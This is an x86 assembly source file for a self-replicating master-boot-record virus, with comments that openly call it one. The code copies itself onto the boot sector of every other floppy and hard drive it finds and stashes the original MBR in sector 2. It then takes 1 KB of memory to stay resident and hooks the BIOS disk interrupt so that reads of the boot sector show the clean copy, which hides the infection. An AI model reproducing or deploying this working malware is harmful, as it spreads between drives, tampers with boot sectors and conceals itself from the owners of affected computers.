[bits 16]
org 0x7c00

start:
  cli                           ; no interrupt zone
  mov BYTE [bootDrive], dl      ; save boot drive, this is infected drive
  mov sp, 0xFFF8                ; stack pointer
  pusha                         ; save all registers
  xor ax, ax
  mov ds, ax
  mov es, ax                    ; clean regs

  ; here we traverse through all disks and copy infected MBR to boot sector
  ; it checks whether virus signature exists already - it doesn't do anything
  xor di, di                    ; our disk counter
dsk_lp:
  mov dl, [disk_codes+di]       ; load disk code from our table
  cmp dl, [bootDrive]           ; check if this is our infected drive
  je nxt_disk                   ; this is our drive, just go to the next one

  mov ax, 0x0201                ; read sector, 1 sector
  mov cx, 0x0001                ; cylinder 0, sector=1
  mov bx, 0x7e00                ; load original mbr to 0x7e00
  xor dh, dh                    ; head 0
  call wr_sector
  jc nxt_disk                   ; if carry is set, disk doesn't exist (most likely)
  add bx, sig                   ; check if this drive is already signed
  sub bx, 0x7c00                ; calculated offset for signature
  cmp word [bx], 0xDEAD         ; compare with our signature 0xDEAD
  je nxt_disk                   ; if already signed, jump to next disk

  ; copy partition table to our infected MBR
  mov si, part_table + 0x200    ; source address 0x7e00 + part_table
  mov di, part_table            ; dest address 0x7c00 + part_table
  mov cx, 74                    ; its size it 74 bytes
  rep movsb

  mov ax, 0x0301                ; dirty business, write our infected mbr to new drive
  mov cx, 0x0001                ; cylinder 0, sector=1
  mov bx, 0x7c00                ; copy ourselves to the disk
  call wr_sector                ; perform write

  mov ax, 0x0301
  mov cx, 0x0002                ; write original mbr to 2nd sector
  mov bx, 0x7e00                ; we saved sector to 0x7e00
  call wr_sector
nxt_disk:
  inc di                        ; increment our counter
  cmp di, 0x04                  ; we are over the available disks
  jl dsk_lp                     ; jump if lower than 4

; now we'll copy back original MBR and jump to it
; we have to relocate ourselves to high memory for us to become IMMORTAL (read
; memory resident). We lower actual RAM size by 1KB and copy ourselves to the
;very end of the memory. But before we hook int 0x13 with our code.
relocate:
  xor ax, ax
  mov ds, ax
  dec word [ds:0x413]             ; decrement memory size for 1 KB
  mov ax, [ds:0x413]              ; get last possible address
  shl ax, (10-4)                  ; get segment of top address
  mov es, ax                      ; and save it to es

  mov dl, [bootDrive]             ; retrieve current boot drive
  mov si, cpy_original            ; source address (ds:si)
  xor di, di                      ; dest address (es:di)

  mov cx, end_cpy                 ; load end of code address
  sub cx, cpy_original            ; subtract start of code, cx = code length
  rep movsb                       ; copy stuff from source to dest address

  push es                         ; no we can jump to our copy, segment
  push word 0x0                   ; and offset
  retf                            ; goodbye 0x7c00, welcome 0x9... something

; this code resides on high addresses after copying and will be memory resident
cpy_original:                   ; this code will copy original MBR to 0x7c00
  xor ax, ax
  mov es, ax
  mov ax, 0x201                 ; read 1 sector
  mov cx, 0x0002                ; read 2nd sector
  mov bx, 0x7c00                ; dest address
  call wr_sector                ; copy orignal MBR

  ; before we jump into org mbr, let's hook int 13h
  mov ax, word [es:0x13*4]                  ; get old 13h vector (offset)
  mov bx, word [es:0x13*4+2]                ; get old 13h vector (segment)
  mov [cs:oldint13-cpy_original], ax        ; save old interrupt offset
  mov [cs:oldint13-cpy_original+2], bx      ; save old interrupt segment
  mov ax, dsk_hook
  sub ax, cpy_original                      ; calculate real address of hook
  mov word [es:0x13*4], ax
  mov word [es:0x13*4+2], cs                ; save new adress to 13h vector
  popa                                      ; restore old regs
  sti                                       ; enable interrupts
  jmp 0x0:0x7c00                            ; far jump to the original MBR
  ; original MBR won't even notice, huehuehue

; disk hook that will resident in memory
; redirects any reads for 0-0-1 (first) sector to 0-0-2 (2nd) sector
; in order to conceal our identity and to trick original MBR in accessing
; it's original info
; Additionally it prints some stuff when disk is being accessed 40 times.
; Just to show it works.
dsk_hook:
  pushf                                         ; push flags
  cmp ah, 0x02                                  ; check if read access
  jne .end_hook
  cmp cx, 0x0001                                ; check if 1st sector
  jne .end_hook
  or dh, dh                                     ; check if head = 0
  jnz .end_hook
  mov cx, 0x0002                                ; change it to sector 2
.end_hook:
  popf

  ; prints something to screen when disk is accessed
  ; (every 40th time) not really stealth but we need something to show
  ; that virus is memory resident
  pusha                                         ; save regs
  mov al, [cs:access_counter-cpy_original]      ; get counter
  inc al                                        ; increase counter
  mov [cs:access_counter-cpy_original], al      ; save it back
  cmp al, 40                                    ; check if we reached 40 accesses.
  jl .not_print                                 ; if we didn't, just jump over

  mov byte [cs:access_counter-cpy_original], 0  ; we did, reset counter
  xor di, di                                    ; counter for message
.lp:
  mov ah, 0x0E                                  ; TTY output character interrupt
  mov al, [cs:msg-cpy_original+di]              ; get character from message
  int 0x10                                      ; print character to screen
  inc di                                        ; increase counter
  cmp di, 17                                    ; check if reached the end of msg
  jl .lp                                        ; we didn't, next char
.not_print:
  popa                                          ; restore all regs

  push word [cs:oldint13-cpy_original+2]        ; push segment
  push word [cs:oldint13-cpy_original]          ; push offset
  retf                                          ; call original handler

oldint13:
  dd 0xDEBEFEAA                                 ; var for saving int13 address
msg:
  db "OG got this bois!"                        ; our evil message
access_counter:
  db 0                                          ; counter for number of accesses

; write/read sector on disk, based on
; ah = 0x02 read, ah = 0x03 write
; dl = disk number
; Tries to read 3 times, in case floppy screws us over.
wr_sector:
  mov si, 0x03                  ; max number of attempts to read from drive
  .lprs:
    int 0x13
    jnc .endrs                  ; alright carry was not set, read was successful
    dec si                      ; decrement counter
    jc .endrs
    push ax
    xor ah, ah                  ; ah = 0, reset disk
    int 0x13                    ; reset disk, we have to try this at most 3 times
    pop ax
    jmp .lprs
  .endrs:
    retn

end_cpy:                        ; end of memory resident code

; non resident variables
bootDrive db 0                ; driver number variable
disk_codes:                   ; available drives
  db 0x0                      ; first floppy disk
  db 0x1                      ; second floppy disk
  db 0x80                     ; first hard disk
  db 0x81                     ; second hard disk
sig dw 0xDEAD                 ; very creative signature
db "VIRUS SIGNATURE.$"        ; for easier to see when seeing MBR code

times (0x1b4 - ($-$$)) nop    ; padding for MBR partition table

part_table:
UID times 10 db 0             ; unique disk ID
PT1 times 16 db 0             ; first partition entry
PT2 times 16 db 0             ; second partition entry
PT3 times 16 db 0             ; third partition entry
PT4 times 16 db 0             ; fourth partition entry

dw 0xAA55                     ; boot signature
